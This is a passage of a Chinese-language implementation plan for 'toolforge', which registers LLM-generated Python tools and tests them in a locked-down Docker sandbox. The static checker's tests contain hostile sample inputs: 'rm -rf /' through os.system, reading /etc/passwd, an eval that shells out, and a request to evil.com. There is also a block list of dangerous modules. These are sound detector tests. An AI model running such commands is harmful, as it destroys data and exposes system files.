            ids=[tool_id],
            documents=[f"{name}: {description} [category: {category}]"],
            metadatas=[{"name": name, "tool_id": tool_id}],
        )

    def search(self, query: str, top_k: int = 5) -> list[dict]:
        """语义搜索最匹配的工具。"""
        results = self._collection.query(
            query_texts=[query],
            n_results=min(top_k, self._collection.count()),
        )
        if not results["ids"] or not results["ids"][0]:
            return []

        out = []
        for i, tool_id in enumerate(results["ids"][0]):
            metadata = results["metadatas"][0][i] if results["metadatas"] else {}
            distance = results["distances"][0][i] if results["distances"] else 0
            out.append({
                "tool_id": tool_id,
                "name": metadata.get("name", ""),
                "distance": distance,
            })
        return out

    def delete(self, tool_id: str) -> None:
        """从向量库中删除工具索引。"""
        self._collection.delete(ids=[tool_id])

    def count(self) -> int:
        return self._collection.count()
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_registry/test_vector_store.py -v`
Expected: PASS (3 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/registry/vector_store.py tests/test_registry/test_vector_store.py
git commit -m "feat: add ChromaDB vector store for semantic tool search"
```

---

### Task 6: Tool Registry — 统一接口

**Files:**
- Create: `toolforge/registry/registry.py`
- Create: `tests/test_registry/test_registry.py`

- [ ] **Step 1: 为 Registry 统一接口编写失败测试**

```python
# tests/test_registry/test_registry.py
import pytest
from toolforge.registry.registry import ToolRegistry
from toolforge.registry.models import ToolMeta, ToolRecord, ToolSource
from toolforge.config import Config, RegistryConfig


@pytest.fixture
async def registry(temp_dir):
    config = Config(
        registry=RegistryConfig(
            db_path=str(temp_dir / "test.db"),
            vector_path=str(temp_dir / "chromadb"),
            tools_path=str(temp_dir / "tools"),
        )
    )
    reg = ToolRegistry(config)
    await reg.initialize()
    yield reg
    await reg.close()


@pytest.mark.asyncio
async def test_add_and_search_tool(registry):
    record = ToolRecord(
        meta=ToolMeta(
            name="http_client",
            description="发送HTTP请求的工具",
            category="data_fetching",
            source=ToolSource.BUILTIN,
        ),
        code="def http_get(url): pass",
        test_code="def test_http_get(): pass",
    )
    await registry.add_tool(record)

    results = await registry.search("HTTP请求")
    assert len(results) > 0
    assert results[0].name == "http_client"


@pytest.mark.asyncio
async def test_search_returns_empty_when_no_match(registry):
    results = await registry.search("不存在的功能")
    assert results == []


@pytest.mark.asyncio
async def test_log_execution_and_get_stats(registry):
    record = ToolRecord(
        meta=ToolMeta(name="test_tool", description="test", category="test"),
        code="code",
        test_code="test",
    )
    await registry.add_tool(record)

    await registry.log_execution(record.id, task_id="t1", success=True, execution_time_ms=100)
    await registry.log_execution(record.id, task_id="t2", success=False, execution_time_ms=200, error="timeout")

    stats = await registry.get_tool_stats(record.id)
    assert stats["total_calls"] == 2
    assert stats["success_rate"] == 0.5


@pytest.mark.asyncio
async def test_mark_tool_suspicious(registry):
    record = ToolRecord(
        meta=ToolMeta(name="bad_tool", description="bad", category="test"),
        code="bad",
        test_code="test",
    )
    await registry.add_tool(record)
    await registry.mark_suspicious(record.id, "检测到异常调用模式")

    # 标记为可疑后不应出现在搜索结果中
    results = await registry.search("bad")
    assert not any(r.name == "bad_tool" for r in results)
```

Run: `pytest tests/test_registry/test_registry.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 Registry 统一接口**

```python
# toolforge/registry/registry.py
"""Tool Registry 统一接口 — 协调三层存储。"""
from toolforge.config import Config
from toolforge.registry.models import ToolMeta, ToolRecord, ToolSource, ToolStatus, ExecutionRecord
from toolforge.registry.file_store import FileStore
from toolforge.registry.db_store import DBStore
from toolforge.registry.vector_store import VectorStore


class ToolRegistry:
    """三层存储的统一入口。"""

    def __init__(self, config: Config):
        self._config = config
        self._file_store = FileStore(config.registry.tools_path)
        self._db = DBStore(config.registry.db_path)
        self._vector = VectorStore(config.registry.vector_path)

    async def initialize(self):
        await self._db.initialize()

    async def close(self):
        await self._db.close()

    async def add_tool(self, record: ToolRecord) -> None:
        """添加工具到三层存储。"""
        # 1. 保存到文件层
        self._file_store.save(record)
        # 2. 写入 SQLite
        await self._db.insert_tool(record)
        # 3. 索引到向量库
        self._vector.add(
            tool_id=record.id,
            name=record.name,
            description=record.meta.description,
            category=record.category,
        )

    async def get_tool(self, tool_id: str) -> ToolRecord | None:
        """通过 ID 获取完整工具记录（含代码）。"""
        db_record = await self._db.get_tool(tool_id)
        if not db_record:
            return None
        try:
            return self._file_store.load(db_record["name"], db_record["category"])
        except FileNotFoundError:
            return None

    async def search(self, query: str, top_k: int = 5) -> list[ToolRecord]:
        """语义搜索工具，返回按信任链优先度排序的结果。"""
        vector_results = self._vector.search(query, top_k=top_k)
        if not vector_results:
            return []

        records = []
        for vr in vector_results:
            db_record = await self._db.get_tool(vr["tool_id"])
            if db_record and db_record["status"] == "active":
                try:
                    full = self._file_store.load(db_record["name"], db_record["category"])
                    records.append(full)
                except FileNotFoundError:
                    continue

        # 按 source 优先度排序: verified > builtin > auto
        _priority = {ToolSource.VERIFIED: 3, ToolSource.BUILTIN: 2, ToolSource.AUTO: 1}
        records.sort(key=lambda r: _priority.get(r.source, 0), reverse=True)
        return records[:top_k]

    async def log_execution(
        self,
        tool_id: str,
        task_id: str,
        success: bool,
        execution_time_ms: int,
        sandbox_id: str = "",
        error: str = "",
    ) -> None:
        """记录工具调用。"""
        record = ExecutionRecord(
            tool_id=tool_id,
            task_id=task_id,
            success=success,
            execution_time_ms=execution_time_ms,
            sandbox_id=sandbox_id,
            error_message=error,
        )
        await self._db.log_execution(record)

    async def get_tool_stats(self, tool_id: str) -> dict:
        """获取工具的调用统计。"""
        return await self._db.get_tool_stats(tool_id)

    async def mark_suspicious(self, tool_id: str, reason: str) -> None:
        """将工具标记为可疑。"""
        await self._db.update_tool_status(tool_id, ToolStatus.SUSPICIOUS)
        await self._db.log_security_event(tool_id, "marked_suspicious", reason)
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_registry/test_registry.py -v`
Expected: PASS (4 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/registry/registry.py tests/test_registry/test_registry.py
git commit -m "feat: add unified Tool Registry interface coordinating three storage layers"
```

---

### Task 7: Sandbox — Docker 容器管理

**Files:**
- Create: `toolforge/sandbox/__init__.py`
- Create: `toolforge/sandbox/docker_manager.py`
- Create: `tests/test_sandbox/__init__.py`
- Create: `tests/test_sandbox/test_docker_manager.py`

- [ ] **Step 1: 为 DockerManager 编写失败测试**

```python
# tests/test_sandbox/test_docker_manager.py
import pytest
from toolforge.sandbox.docker_manager import DockerManager
from toolforge.config import Config, SandboxConfig


@pytest.fixture
def docker_manager():
    config = Config(
        sandbox=SandboxConfig(
            memory_limit_mb=128,
            timeout_seconds=10,
            pids_limit=30,
        )
    )
    return DockerManager(config)


def test_build_sandbox_args(docker_manager):
    """测试沙盒参数生成（不要求 Docker 运行）。"""
    args = docker_manager._build_container_args()
    assert "--read-only" in args
    assert "--network=none" in args
    assert "--memory=128m" in args
    assert "--cpus=1" in args
    assert "--pids-limit=30" in args
    assert "--cap-drop=ALL" in args
    assert "--security-opt=no-new-privileges" in args


def test_is_docker_available_runs(mocker):
    """测试 Docker 可用性检查（mock Docker 客户端）。"""
    mock_client = mocker.patch("docker.from_env")
    mock_client.return_value.ping.return_value = True

    config = Config(sandbox=SandboxConfig())
    manager = DockerManager(config)
    assert manager.is_available() is True


def test_is_docker_unavailable(mocker):
    """测试 Docker 不可用时的处理。"""
    mock_client = mocker.patch("docker.from_env")
    mock_client.side_effect = Exception("Docker not running")

    config = Config(sandbox=SandboxConfig())
    manager = DockerManager(config)
    assert manager.is_available() is False
```

Run: `pytest tests/test_sandbox/test_docker_manager.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 DockerManager**

```python
# toolforge/sandbox/docker_manager.py
"""Docker 沙盒管理 — 容器创建、执行、销毁。"""
import json
import tempfile
from pathlib import Path
from toolforge.config import Config
from toolforge.exceptions import SandboxError, SandboxTimeoutError


class DockerManager:
    def __init__(self, config: Config):
        self._config = config
        self._docker = None

    def _get_docker(self):
        if self._docker is None:
            import docker
            self._docker = docker.from_env()
        return self._docker

    def is_available(self) -> bool:
        try:
            self._get_docker().ping()
            return True
        except Exception:
            return False

    def _build_container_args(self) -> list[str]:
        """构建 Docker run 参数列表（供测试验证）。"""
        return [
            "--rm",
            "--read-only",
            "--network=none",
            f"--memory={self._config.sandbox.memory_limit_mb}m",
            f"--memory-swap={self._config.sandbox.memory_limit_mb}m",
            f"--cpus={int(self._config.sandbox.cpu_limit)}",
            f"--pids-limit={self._config.sandbox.pids_limit}",
            "--tmpfs", "/tmp:size=64m,noexec",
            "--cap-drop=ALL",
            "--security-opt=no-new-privileges",
            "--ulimit", "nofile=64",
        ]

    async def execute(
        self,
        tool_code: str,
        test_code: str,
        metadata: dict,
    ) -> dict:
        """在沙盒中执行工具代码和测试代码。

        Returns:
            dict with keys: success, exit_code, stdout, stderr, execution_time_ms
        """
        import asyncio

        with tempfile.TemporaryDirectory() as tmpdir:
            tmp = Path(tmpdir)
            # 写入代码文件（仅用于挂载到容器，不在主机执行）
            (tmp / "tool.py").write_text(tool_code, encoding="utf-8")
            (tmp / "test_tool.py").write_text(test_code, encoding="utf-8")

            # 构建执行脚本
            runner_script = _build_runner_script()
            (tmp / "run_tests.py").write_text(runner_script, encoding="utf-8")

            timeout = self._config.sandbox.timeout_seconds
            docker = self._get_docker()

            try:
                container = docker.containers.run(
                    image=self._config.sandbox.base_image,
                    command=["python", "/code/run_tests.py"],
                    volumes={str(tmp): {"bind": "/code", "mode": "ro"}},
                    working_dir="/code",
                    detach=True,
                    **self._get_run_kwargs(),
                )

                loop = asyncio.get_event_loop()
                result = await loop.run_in_executor(None, container.wait, timeout)

                logs = container.logs(stdout=True, stderr=True).decode("utf-8", errors="replace")

                try:
                    test_result = json.loads(logs.split("\n__RESULT__\n")[-1].strip())
                except (json.JSONDecodeError, IndexError):
                    test_result = {
                        "passed": False,
                        "output": logs,
                        "error": "Failed to parse test results",
                    }

                container.remove(force=True)

                return {
                    "success": test_result.get("passed", False),
                    "exit_code": result.get("StatusCode", -1),
                    "stdout": test_result.get("output", ""),
                    "stderr": test_result.get("error", ""),
                    "execution_time_ms": test_result.get("execution_time_ms", 0),
                }

            except Exception as e:
                timeout_keywords = ("timeout", "timed out")
                if any(kw in str(e).lower() for kw in timeout_keywords):
                    raise SandboxTimeoutError(f"Sandbox execution timed out: {e}")
                raise SandboxError(f"Sandbox execution failed: {e}", stderr=str(e))

    def _get_run_kwargs(self) -> dict:
        return {
            "read_only": True,
            "network_mode": "none",
            "mem_limit": f"{self._config.sandbox.memory_limit_mb}m",
            "memswap_limit": f"{self._config.sandbox.memory_limit_mb}m",
            "nano_cpus": int(self._config.sandbox.cpu_limit * 1_000_000_000),
            "pids_limit": self._config.sandbox.pids_limit,
            "tmpfs": {"/tmp": "size=64m,noexec"},
            "cap_drop": ["ALL"],
            "security_opt": ["no-new-privileges"],
            "ulimits": [{"name": "nofile", "soft": 64, "hard": 64}],
        }

    async def verify_sandbox(self) -> bool:
        """快速验证沙盒是否可正常工作。"""
        try:
            result = await self.execute(
                tool_code="def hello():\n    return 'ok'",
                test_code="""import json\nfrom tool import hello\ndef test_hello():\n    assert hello() == 'ok'\nif __name__ == '__main__':\n    import sys, time\n    start = time.time()\n    try:\n        test_hello()\n        print("__RESULT__")\n        print(json.dumps({"passed": True, "execution_time_ms": int((time.time()-start)*1000)}))\n    except Exception as e:\n        print("__RESULT__")\n        print(json.dumps({"passed": False, "error": str(e), "execution_time_ms": 0}))""",
                metadata={"name": "sandbox_test"},
            )
            return result["success"]
        except SandboxError:
            return False


def _build_runner_script() -> str:
    """生成在容器内运行的测试脚本。"""
    return '''import json
import sys
import time
import traceback

# 导入工具模块和测试模块
from tool import *
from test_tool import *

def run_all_tests():
    """运行所有以 test_ 开头的函数。"""
    passed = 0
    failed = 0
    output_lines = []
    error_lines = []

    test_funcs = [
        (name, obj) for name, obj in globals().items()
        if name.startswith("test_") and callable(obj)
    ]

    for name, func in test_funcs:
        try:
            func()
            passed += 1
            output_lines.append(f"PASS: {name}")
        except AssertionError as e:
            failed += 1
            error_lines.append(f"FAIL: {name} - {e}")
        except Exception as e:
            failed += 1
            error_lines.append(f"ERROR: {name} - {e}\\n{traceback.format_exc()}")

    return {
        "passed": failed == 0,
        "output": "\\n".join(output_lines + error_lines),
        "error": "\\n".join(error_lines) if error_lines else "",
        "passed_count": passed,
        "failed_count": failed,
    }


if __name__ == "__main__":
    start = time.time()
    try:
        result = run_all_tests()
        result["execution_time_ms"] = int((time.time() - start) * 1000)
    except Exception as e:
        result = {
            "passed": False,
            "output": "",
            "error": f"Test runner crashed: {e}\\n{traceback.format_exc()}",
            "execution_time_ms": 0,
        }

    print("__RESULT__")
    print(json.dumps(result))
'''
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_sandbox/test_docker_manager.py -v`
Expected: PASS (3 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/sandbox/ tests/test_sandbox/
git commit -m "feat: add Docker sandbox manager with secure container execution"
```

---

### Task 8: Sandbox — 镜像构建器

**Files:**
- Modify: `toolforge/sandbox/__init__.py`
- Create: `toolforge/sandbox/image_builder.py`
- Create: `sandbox/Dockerfile`

- [ ] **Step 1: 创建 Dockerfile**

```dockerfile
# sandbox/Dockerfile
FROM python:3.12-slim

# 预装常用库
RUN pip install --no-cache-dir \
    requests \
    beautifulsoup4 \
    pandas \
    pillow \
    lxml \
    openpyxl \
    python-docx \
    PyPDF2

# 创建非 root 用户
RUN useradd --create-home --shell /bin/bash sandbox
USER sandbox
WORKDIR /home/sandbox
```

- [ ] **Step 2: 实现镜像构建器**

```python
# toolforge/sandbox/image_builder.py
"""构建沙盒 Docker 镜像。"""
from pathlib import Path
from toolforge.exceptions import SandboxError


class ImageBuilder:
    """构建预装依赖的沙盒镜像。"""

    SANDBOX_IMAGE = "toolforge-sandbox:latest"
    _dockerfile_path = Path(__file__).parent.parent.parent / "sandbox" / "Dockerfile"

    def __init__(self):
        self._docker = None

    def _get_docker(self):
        if self._docker is None:
            import docker
            self._docker = docker.from_env()
        return self._docker

    def build(self, force: bool = False) -> str:
        """构建沙盒镜像。返回镜像 ID。"""
        docker = self._get_docker()
        if not force:
            try:
                docker.images.get(self.SANDBOX_IMAGE)
                return self.SANDBOX_IMAGE
            except Exception:
                pass

        dockerfile_dir = str(self._dockerfile_path.parent)
        if not self._dockerfile_path.exists():
            raise SandboxError(f"Dockerfile not found at {self._dockerfile_path}")

        image, _ = docker.images.build(
            path=dockerfile_dir,
            tag=self.SANDBOX_IMAGE,
            rm=True,
        )
        return image.id

    def is_built(self) -> bool:
        try:
            self._get_docker().images.get(self.SANDBOX_IMAGE)
            return True
        except Exception:
            return False
```

- [ ] **Step 3: 为镜像构建器编写测试**

```python
# 追加到 tests/test_sandbox/test_docker_manager.py

def test_image_builder_is_not_built_by_default(mocker):
    mocker.patch("docker.from_env")
    from toolforge.sandbox.image_builder import ImageBuilder
    builder = ImageBuilder()
    # 在单元测试中 Docker 不可用，应返回 False
    assert builder.is_built() is False
```

Run: `pytest tests/test_sandbox/ -v`
Expected: PASS (4 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/sandbox/image_builder.py sandbox/ tests/test_sandbox/
git commit -m "feat: add Docker sandbox image builder with pre-installed dependencies"
```

---

### Task 9: Tool Smith — 静态安全检查器

**Files:**
- Create: `toolforge/smith/__init__.py`
- Create: `toolforge/smith/models.py`
- Create: `toolforge/smith/static_checker.py`
- Create: `tests/test_smith/__init__.py`
- Create: `tests/test_smith/test_static_checker.py`

- [ ] **Step 1: 创建 Smith 数据模型**

```python
# toolforge/smith/models.py
"""Tool Smith 数据模型 — 生成产物结构。"""
from pydantic import BaseModel, Field


class GeneratedTool(BaseModel):
    """LLM 生成的工具产物。"""
    tool_name: str
    version: str = "0.1.0"
    description: str
    category: str
    dependencies: list[str] = Field(default_factory=list)
    code: str
    test_code: str
    usage_example: str = ""
    source: str = "llm_generated"


class StaticCheckResult(BaseModel):
    """静态检查结果。"""
    passed: bool
    violations: list[str] = Field(default_factory=list)
    warnings: list[str] = Field(default_factory=list)
```

- [ ] **Step 2: 为 StaticChecker 编写失败测试**

```python
# tests/test_smith/test_static_checker.py
from toolforge.smith.static_checker import StaticChecker


def test_pass_clean_code():
    checker = StaticChecker()
    code = """
def hello():
    return "hello world"

def test_hello():
    assert hello() == "hello world"
"""
    result = checker.check(code)
    assert result.passed is True
    assert result.violations == []


def test_block_os_import():
    checker = StaticChecker()
    code = "import os\nos.system('rm -rf /')"
    result = checker.check(code)
    assert result.passed is False
    assert any("import os" in v for v in result.violations)


def test_block_subprocess_import():
    checker = StaticChecker()
    code = "from subprocess import run\nrun(['ls'])"
    result = checker.check(code)
    assert result.passed is False
    assert any("subprocess" in v for v in result.violations)


def test_block_eval():
    checker = StaticChecker()
    code = "eval('__import__(\"os\").system(\"ls\")')"
    result = checker.check(code)
    assert result.passed is False
    assert any("eval" in v for v in result.violations)


def test_block_exec():
    checker = StaticChecker()
    code = "exec('print(1)')"
    result = checker.check(code)
    assert result.passed is False


def test_block_open_call():
    checker = StaticChecker()
    code = "open('/etc/passwd', 'r').read()"
    result = checker.check(code)
    assert result.passed is False
    assert any("open()" in v for v in result.violations)


def test_block_requests_import():
    checker = StaticChecker()
    code = "import requests\nrequests.get('http://evil.com')"
    result = checker.check(code)
    assert result.passed is False
    assert any("requests" in v for v in result.violations)


def test_block_socket_import():
    checker = StaticChecker()
    code = "import socket\ns = socket.socket()"
    result = checker.check(code)
    assert result.passed is False


def test_allow_with_template_whitelist():
    checker = StaticChecker()
    code = "import requests\nrequests.get('https://api.example.com/data')"
    result = checker.check(code, whitelist=["requests"])
    assert result.passed is True


def test_block_ctypes_import():
    checker = StaticChecker()
    code = "import ctypes\nctypes.CDLL('./lib.so')"
    result = checker.check(code)
    assert result.passed is False
```

Run: `pytest tests/test_smith/test_static_checker.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 3: 实现 StaticChecker**

```python
# toolforge/smith/static_checker.py
"""AST 静态安全检查器 — 分析代码中的危险调用而不执行。"""
import ast
from toolforge.smith.models import StaticCheckResult


class StaticChecker:
    """基于 AST 的代码安全检查器。"""

    # 禁止导入的模块
    FORBIDDEN_IMPORTS = {
        "os", "subprocess", "sys", "ctypes", "pickle", "shutil",
        "socket", "requests", "urllib", "http.client",
    }

    # 禁止调用的函数
    FORBIDDEN_CALLS = {
        "eval", "exec", "compile", "__import__",
        "open", "input",
    }

    def check(self, code: str, whitelist: list[str] | None = None) -> StaticCheckResult:
        """对代码进行静态安全检查。

        Args:
            code: 待检查的 Python 代码
            whitelist: 白名单模块列表（模板声明允许的导入）
        """
        whitelist_set = set(whitelist or [])
        violations: list[str] = []
        warnings: list[str] = []

        try:
            tree = ast.parse(code)
        except SyntaxError as e:
            return StaticCheckResult(
                passed=False,
                violations=[f"Syntax error: {e}"],
            )

        for node in ast.walk(tree):
            # 检查导入
            if isinstance(node, ast.Import):
                for alias in node.names:
                    base_module = alias.name.split(".")[0]
                    if base_module in self.FORBIDDEN_IMPORTS and base_module not in whitelist_set:
                        violations.append(f"Blocked import: import {alias.name}")

            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    base_module = node.module.split(".")[0]
                    if base_module in self.FORBIDDEN_IMPORTS and base_module not in whitelist_set:
                        violations.append(f"Blocked import: from {node.module} import ...")

            # 检查函数调用
            elif isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in self.FORBIDDEN_CALLS:
                        violations.append(f"Blocked call: {node.func.id}()")
                elif isinstance(node.func, ast.Attribute):
                    if node.func.attr in self.FORBIDDEN_CALLS:
                        violations.append(f"Blocked call: .{node.func.attr}()")

        return StaticCheckResult(
            passed=len(violations) == 0,
            violations=violations,
            warnings=warnings,
        )
```

- [ ] **Step 4: 运行测试验证**

Run: `pytest tests/test_smith/test_static_checker.py -v`
Expected: PASS (10 tests)

- [ ] **Step 5: Commit**

```bash
git add toolforge/smith/ tests/test_smith/
git commit -m "feat: add AST-based static security checker for generated tools"
```

---

### Task 10: Tool Smith — 模板引擎

**Files:**
- Create: `toolforge/smith/template_engine.py`
- Create: `tools/test_registry/test_template_engine.py`

- [ ] **Step 1: 为 TemplateEngine 编写失败测试**

```python
# tests/test_smith/test_template_engine.py
import pytest
from toolforge.smith.template_engine import TemplateEngine, ToolTemplate


@pytest.fixture
def engine(temp_dir):
    # 创建一个测试模板
    tmpl_dir = temp_dir / "templates" / "api_caller"
    tmpl_dir.mkdir(parents=True)
    (tmpl_dir / "template.yaml").write_text("""
name: api_caller
description: "调用 HTTP API 获取数据的工具模板"
category: data_fetching
parameters:
  - name: url
    type: string
    required: true
    description: "API 端点 URL"
  - name: method
    type: choice
    options: [GET, POST]
    default: GET
whitelist:
  - requests
""")
    (tmpl_dir / "tool_template.py").write_text("""
import requests

def fetch_data(url="{{ url }}", method="{{ method }}"):
    if method == "GET":
        resp = requests.get(url)
    else:
        resp = requests.post(url)
    return resp.text
""")
    (tmpl_dir / "test_template.py").write_text("""
def test_fetch_data():
    result = fetch_data("{{ test_url }}", "{{ method }}")
    assert result is not None
""")

    return TemplateEngine(str(tmpl_dir.parent))


def test_load_template(engine):
    tmpl = engine.get_template("api_caller")
    assert tmpl is not None
    assert tmpl.name == "api_caller"
    assert tmpl.whitelist == ["requests"]


def test_match_template(engine):
    results = engine.match("调用API获取数据")
    assert len(results) > 0
    assert results[0].name == "api_caller"


def test_no_match(engine):
    results = engine.match("x" * 100)
    assert len(results) == 0


def test_render_template(engine):
    tmpl = engine.get_template("api_caller")
    rendered = engine.render(
        tmpl,
        params={
            "url": "https://api.example.com",
            "method": "GET",
            "test_url": "https://api.example.com",
        },
    )
    assert "https://api.example.com" in rendered.code
    assert "https://api.example.com" in rendered.test_code
```

Run: `pytest tests/test_smith/test_template_engine.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 TemplateEngine**

```python
# toolforge/smith/template_engine.py
"""模板引擎 — 匹配、加载、渲染工具模板。"""
import yaml
from pathlib import Path
from dataclasses import dataclass, field


@dataclass
class ToolTemplate:
    name: str
    description: str
    category: str
    parameters: list[dict] = field(default_factory=list)
    whitelist: list[str] = field(default_factory=list)
    code_skeleton: str = ""
    test_skeleton: str = ""


class TemplateEngine:
    """管理和渲染工具模板。"""

    def __init__(self, templates_dir: str):
        self._dir = Path(templates_dir)
        self._templates: dict[str, ToolTemplate] = {}
        self._load_all()

    def _load_all(self):
        if not self._dir.exists():
            return
        for yaml_file in self._dir.rglob("template.yaml"):
            tmpl_dir = yaml_file.parent
            with open(yaml_file, encoding="utf-8") as f:
                data = yaml.safe_load(f)
            code = (tmpl_dir / "tool_template.py").read_text(encoding="utf-8")
            test = (tmpl_dir / "test_template.py").read_text(encoding="utf-8")
            tmpl = ToolTemplate(
                name=data["name"],
                description=data.get("description", ""),
                category=data.get("category", ""),
                parameters=data.get("parameters", []),
                whitelist=data.get("whitelist", []),
                code_skeleton=code,
                test_skeleton=test,
            )
            self._templates[tmpl.name] = tmpl

    def get_template(self, name: str) -> ToolTemplate | None:
        return self._templates.get(name)

    def match(self, query: str) -> list[ToolTemplate]:
        """基于关键词匹配模板。返回匹配度排序的列表。"""
        query_lower = query.lower()
        scored = []
        for tmpl in self._templates.values():
            score = 0
            desc_lower = tmpl.description.lower()
            # 简单关键词匹配
            for word in query_lower.split():
                if word in desc_lower or word in tmpl.name.lower():
                    score += 1
            if score > 0:
                scored.append((score, tmpl))
        scored.sort(key=lambda x: x[0], reverse=True)
        return [tmpl for _, tmpl in scored]

    def render(self, template: ToolTemplate, params: dict[str, str]) -> "GeneratedTool":
        """用参数填充模板占位符。"""
        from toolforge.smith.models import GeneratedTool

        code = template.code_skeleton
        test_code = template.test_skeleton

        for key, value in params.items():
            code = code.replace(f"{{{{ {key} }}}}", str(value))
            test_code = test_code.replace(f"{{{{ {key} }}}}", str(value))

        return GeneratedTool(
            tool_name=template.name,
            description=template.description,
            category=template.category,
            code=code,
            test_code=test_code,
        )
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_smith/test_template_engine.py -v`
Expected: PASS (4 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/smith/template_engine.py tests/test_smith/test_template_engine.py
git commit -m "feat: add template engine for matching and rendering tool templates"
```

---

### Task 11: Tool Smith — LLM 代码生成器

**Files:**
- Create: `toolforge/smith/code_generator.py`
- Create: `tests/test_smith/test_code_generator.py`

- [ ] **Step 1: 为 CodeGenerator 编写失败测试**

```python
# tests/test_smith/test_code_generator.py
import pytest
from toolforge.smith.code_generator import CodeGenerator
from toolforge.llm.base import LLMAdapter


class MockAdapter(LLMAdapter):
    """用于测试的 mock LLM 适配器。"""
    def __init__(self):
        super().__init__(model="mock", api_key="", base_url="")

    async def chat(self, messages, tools=None, tool_choice=None, temperature=0.7, max_tokens=4096):
        return {"choices": [{"message": {"content": "{}"}}]}

    async def generate_structured(self, system_prompt, user_prompt, output_schema, temperature=0.3):
        return {
            "tool_name": "pdf_extractor",
            "version": "0.1.0",
            "description": "Extract text from PDF files",
            "category": "document_processing",
            "dependencies": ["PyPDF2"],
            "code": "import PyPDF2\n\ndef extract_pdf(path):\n    with open(path, 'rb') as f:\n        reader = PyPDF2.PdfReader(f)\n        return '\\n'.join([p.extract_text() for p in reader.pages])",
            "test_code": "def test_extract_pdf():\n    pass",
            "usage_example": "extract_pdf('file.pdf')",
        }


@pytest.mark.asyncio
async def test_generate_tool():
    gen = CodeGenerator(adapter=MockAdapter())
    result = await gen.generate(
        tool_name="pdf_extractor",
        purpose="从PDF文件中提取文本内容",
        context="用户上传了一个PDF文件，需要读取其中的内容",
    )
    assert result.tool_name == "pdf_extractor"
    assert result.category == "document_processing"
    assert "PyPDF2" in result.code


@pytest.mark.asyncio
async def test_generate_sets_source():
    gen = CodeGenerator(adapter=MockAdapter())
    result = await gen.generate(
        tool_name="test_tool",
        purpose="test",
        context="test",
    )
    assert result.source == "llm_generated"


def test_build_generation_prompt():
    """测试 prompt 构建逻辑。"""
    from toolforge.smith.code_generator import _build_system_prompt
    prompt = _build_system_prompt()
    assert "Python" in prompt
    assert "安全" in prompt
    assert "test_" in prompt
```

Run: `pytest tests/test_smith/test_code_generator.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 CodeGenerator**

```python
# toolforge/smith/code_generator.py
"""LLM 代码生成器 — 让 LLM 从零生成工具代码。"""
import json
from toolforge.llm.base import LLMAdapter
from toolforge.smith.models import GeneratedTool


class CodeGenerator:
    """使用 LLM 自由生成工具代码。"""

    def __init__(self, adapter: LLMAdapter):
        self._adapter = adapter

    async def generate(
        self,
        tool_name: str,
        purpose: str,
        context: str,
    ) -> GeneratedTool:
        """生成完整的工具代码和测试。

        Args:
            tool_name: 提议的工具名称
            purpose: 工具需要完成的功能
            context: 任务上下文（为什么需要这个工具）
        """
        user_prompt = f"""
请生成一个名为 `{tool_name}` 的 Python 工具。

**功能需求**: {purpose}
**使用场景**: {context}

请提供完整的、可直接运行的实现代码和测试代码。注意：
1. 工具函数放在 tool.py 中
2. 测试函数（以 test_ 开头）放在 test_tool.py 中
3. 代码必须有适当的错误处理
4. 不要使用 eval、exec、os、subprocess 等危险模块
5. 如果需要网络请求，使用 requests 库
6. 依赖声明在 dependencies 字段中
"""
        schema = GeneratedTool.model_json_schema()
        result = await self._adapter.generate_structured(
            system_prompt=_build_system_prompt(),
            user_prompt=user_prompt,
            output_schema=schema,
        )
        return GeneratedTool(**result)


def _build_system_prompt() -> str:
    return """你是一个专业的 Python 工具开发者。你的任务是生成高质量、安全、可测试的 Python 工具代码。

要求：
1. 代码必须完整、可直接运行
2. 必须包含测试函数（函数名以 test_ 开头）
3. 测试要覆盖正常场景和边界情况
4. 禁止使用危险模块：os, subprocess, sys, eval, exec, ctypes
5. 禁止直接读写文件系统（除非工具功能明确需要）
6. 添加适当的类型注解和 docstring
7. 依赖列表要准确完整

你的输出将经过静态安全检查和 Docker 沙盒验证，只有通过验证的工具才会被采纳。"""
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_smith/test_code_generator.py -v`
Expected: PASS (3 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/smith/code_generator.py tests/test_smith/test_code_generator.py
git commit -m "feat: add LLM-powered code generator for tool creation"
```

---

### Task 12: Tool Smith — 统一接口

**Files:**
- Create: `toolforge/smith/smith.py`
- Create: `tests/test_smith/test_smith.py`

- [ ] **Step 1: 为 ToolSmith 编写失败测试**

```python
# tests/test_smith/test_smith.py
import pytest
from toolforge.smith.smith import ToolSmith
from toolforge.smith.static_checker import StaticChecker
from toolforge.smith.template_engine import TemplateEngine
from toolforge.smith.models import GeneratedTool


class MockCodeGenerator:
    async def generate(self, tool_name, purpose, context):
        return GeneratedTool(
            tool_name=tool_name,
            description=purpose,
            category="test",
            dependencies=[],
            code="def f(): pass",
            test_code="def test_f(): pass",
        )


class MockSandbox:
    async def execute(self, tool_code, test_code, metadata):
        return {"success": True, "stdout": "PASS", "stderr": "", "execution_time_ms": 10}


@pytest.fixture
def smith(temp_dir):
    # 创建一个测试模板
    tmpl_dir = temp_dir / "templates" / "test_tmpl"
    tmpl_dir.mkdir(parents=True)
    import yaml
    (tmpl_dir / "template.yaml").write_text(yaml.dump({
        "name": "test_tmpl",
        "description": "test template",
        "category": "test",
        "parameters": [],
        "whitelist": [],
    }))
    (tmpl_dir / "tool_template.py").write_text("def test(): pass")
    (tmpl_dir / "test_template.py").write_text("def test_test(): pass")

    engine = TemplateEngine(str(tmpl_dir.parent))
    checker = StaticChecker()
